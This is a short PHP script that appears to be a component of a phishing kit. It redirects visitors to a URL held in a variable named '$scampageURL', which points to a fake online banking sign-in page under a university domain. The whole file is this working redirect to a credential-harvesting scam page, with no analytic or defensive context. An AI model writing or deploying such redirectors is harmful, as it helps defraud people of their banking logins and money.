<?php

$scampageURL = "https://uo.edu.pk/onlinebanking/sign-in/login";
header("location:$scampageURL");

?>